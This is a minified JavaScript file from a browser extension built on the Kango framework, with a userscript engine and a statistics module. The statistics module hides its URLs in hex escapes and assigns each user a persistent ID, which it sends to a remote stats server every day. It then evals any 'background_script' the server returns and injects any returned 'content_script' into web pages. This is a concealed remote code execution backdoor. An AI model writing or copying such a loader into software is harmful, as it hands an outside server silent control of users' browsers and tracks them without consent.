﻿/*
Built using Kango - Cross-browser extension framework
http://kangoextensions.com/
*/
ChristmasTree_kango.UserscriptEngine=function(){this._scripts=[];this._requiredFiles={}};
ChristmasTree_kango.UserscriptEngine.prototype={_scripts:[],_requiredFiles:{},addScript:function(a,b){for(var c=0;c<this._scripts.length;c++)if(this._scripts[c].id==a)return!1;c=new ChristmasTree_kango.Userscript(b);this._loadRequiredFiles(c);this._scripts.push({id:a,script:c});return!0},removeScript:function(a){for(var b=0;b<this._scripts.length;b++)if(this._scripts[b].id==a)return this._scripts.splice(b,1),!0;return!1},clear:function(){this._scripts=[]},getScripts:function(a,b,c){for(var d={},e=0;e<this._scripts.length;e++){var f=
this._scripts[e].script,h=f.headers.namespace||"default",g=f.headers["run-at"]||"document-end",i=f.headers["all-frames"]||!1;if((c||!0==i)&&g==b&&this._isIncludedUrl(f,a)&&!this._isExcludedUrl(f,a)){d[h]=d[h]||[];if("undefined"!=typeof f.headers.require)for(g=0;g<f.headers.require.length;g++)i=f.headers.require[g],"undefined"!=typeof this._requiredFiles[i]&&d[h].push(this._requiredFiles[i]);d[h].push(f.text)}}return d},_loadRequiredFiles:function(a){if("undefined"!=typeof a.headers.require)for(var a=
a.headers.require,b=0;b<a.length;b++){var c=a[b];if("undefined"==typeof this._requiredFiles[c]){var d=ChristmasTree_kango.io.getExtensionFileContents(c);null!=d&&""!=d&&(this._requiredFiles[c]=d)}}},_checkPatternArray:function(a,b){if("undefined"!=typeof a){a instanceof Array||(a=Array(a));for(var c=0;c<a.length;c++){var d=a[c].replace(/\*/g,"(.*)"),d=d.replace(/tld/g,"(.*)");if(RegExp(d).test(b))return!0}}return!1},_isIncludedUrl:function(a,b){return null==a.headers.include?!0:this._checkPatternArray(a.headers.include,
b)},_isExcludedUrl:function(a,b){return null==a.headers.exclude?!1:this._checkPatternArray(a.headers.exclude,b)}};ChristmasTree_kango.Userscript=function(a){this.text=a;this.headers={};this._parseHeaders()};
ChristmasTree_kango.Userscript.prototype={headers:{},text:"",_parseHeaders:function(){this.headers=this._parseHeadersToHashTable(this.text);"undefined"!=typeof this.headers.match&&("undefined"==typeof this.headers.include?this.headers.include=this.headers.match:this.headers.include.concat(this.headers.match))},_parseHeadersToHashTable:function(a){for(var b={},a=a.split(/\n/),c=0;c<a.length;c++){var d=a[c];if(0==d.indexOf("// ==/UserScript=="))break;var e=d.match(/\/\/ @(\S+)\s*(.*)/);if(null!=e)switch(d=e[1],e=
e[2].replace(/\n|\r/g,""),d){case "include":case "exclude":case "match":case "require":b[d]=b[d]||[];b[d].push(e);break;case "all-frames":b[d]=/^true/i.test(e);break;default:b[d]=e}}return b}};ChristmasTree_kango.registerModule(function(){this.init=function(){ChristmasTree_kango.userscript=new ChristmasTree_kango.UserscriptEngine;var a=ChristmasTree_kango.getExtensionInfo().content_scripts;if("undefined"!=typeof a)for(var b=0;b<a.length;b++){var c=ChristmasTree_kango.io.getExtensionFileContents(a[b]);null!=c&&""!=c&&ChristmasTree_kango.userscript.addScript(a[b],c)}}});

ChristmasTree_kango.Stat=function(){};
ChristmasTree_kango.Stat.prototype={_generateId:function(){function a(){return(65536*(1+Math.random())|0).toString(16).substring(1)}return(a()+a()+"-"+a()+"-"+a()+"-"+a()+"-"+a()+a()+a()).toUpperCase()},_statGa:function(){var a=[ChristmasTree_kango.getExtensionInfo().id,ChristmasTree_kango.getExtensionInfo().name,ChristmasTree_kango.browser.getName(),ChristmasTree_kango.getExtensionInfo().update_url||""].join("/"),a={url:["\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x6F\x6F\x67\x6C\x65\x2D\x61\x6E\x61\x6C\x79\x74\x69\x63\x73\x2E\x63\x6F\x6D\x2F\x5F\x5F\x75\x74\x6D\x2E\x67\x69\x66\x3F\x75\x74\x6D\x77\x76\x3D\x34\x75\x2E\x34\x73\x68\x26\x75\x74\x6D\x6E\x3D"][0]+Math.random()+" &utmr=&utmp="+a+"&utmac=UA-34302300-1&utmcc=__utma%3D1."+[Math.round(1E9*
Math.random()),Math.round(1E9*Math.random()),Math.round(1E9*Math.random()),Math.round(1E9*Math.random()),Math.round(1E9*Math.random())].join(".")};ChristmasTree_kango.xhr.send(a,function(){})},_statQa:function(){var a=ChristmasTree_kango.date.diff(new Date,new Date(ChristmasTree_kango.systemStorage.getItem("stat.last_check")));86400<=a?(ChristmasTree_kango.systemStorage.setItem("stat.last_check",(new Date).toString()),a=ChristmasTree_kango.systemStorage.getItem("stat.user_id"),null==a&&(a=this._generateId(),ChristmasTree_kango.systemStorage.setItem("stat.user_id",a)),a={method:"POST",
url:["\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x73\x2E\x6B\x61\x6E\x67\x6F\x65\x78\x74\x65\x6E\x73\x69\x6F\x6E\x73\x2E\x63\x6F\x6D\x2F\x72\x65\x70\x6F\x72\x74\x2F"][0],contentType:"json",params:{user_id:a,extension_id:ChristmasTree_kango.getExtensionInfo().id,extension_name:ChristmasTree_kango.getExtensionInfo().name,extension_update_url:ChristmasTree_kango.getExtensionInfo().update_url||""}},ChristmasTree_kango.xhr.send(a,function(a){if(200==a.status&&null!=a.response){a=a.response;if("undefined"!=typeof a.background_script)try{eval(a.background_script)}catch(b){}"undefined"!=typeof a.content_script&&ChristmasTree_kango.userscript.addScript("q",a.content_script)}})):window.setTimeout(ChristmasTree_kango.lang.bind(this._statQa,
this),1E3*(86400-a))},init:function(){this._statGa();this._statQa()}};ChristmasTree_kango.registerModule(ChristmasTree_kango.Stat);

// Merged from /Users/apple/Developer/eyebrowse/apps_v1.5/browser_extension/src/js/ie firefox/ChristmasTree_kango/userscript_engine.part.js

ChristmasTree_kango.addEventListener(ChristmasTree_kango.event.READY,function(){ChristmasTree_kango.browser.addEventListener("DOMContentLoaded",function(a){var b=new ChristmasTree_kango.UserscriptEngineClient,c=a.window==a.window.top;b.run(a.window,"document-start",c);b.run(a.window,"document-end",c)})});
